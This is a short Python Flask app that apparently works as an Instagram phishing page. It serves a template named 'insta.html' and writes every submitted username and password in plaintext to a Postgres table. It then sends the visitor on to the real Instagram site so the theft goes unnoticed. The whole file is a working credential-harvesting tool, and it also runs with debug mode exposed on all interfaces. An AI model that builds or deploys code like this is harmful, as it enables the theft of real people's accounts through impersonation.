from flask import Flask, render_template, request, redirect
import datetime
import os
import psycopg2
from dotenv import load_dotenv
load_dotenv()
DATABASE_URL = os.getenv("DATABASE_URL")
conn = psycopg2.connect(DATABASE_URL)
cur = conn.cursor()
cur.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id SERIAL PRIMARY KEY,
            name TEXT NOT NULL,
            passwor TEXT NOT NULL
        )
    ''')
conn.commit()

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        name = username
        passwor = password
        cur.execute('INSERT INTO users (name, passwor) VALUES (%s, %s)', (name, password))
        conn.commit()
        # Redirect to any website (e.g., Instagram)
        return redirect("https://www.instagram.com")

    return render_template('insta.html')

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(debug=True, host='0.0.0.0', port=port)
    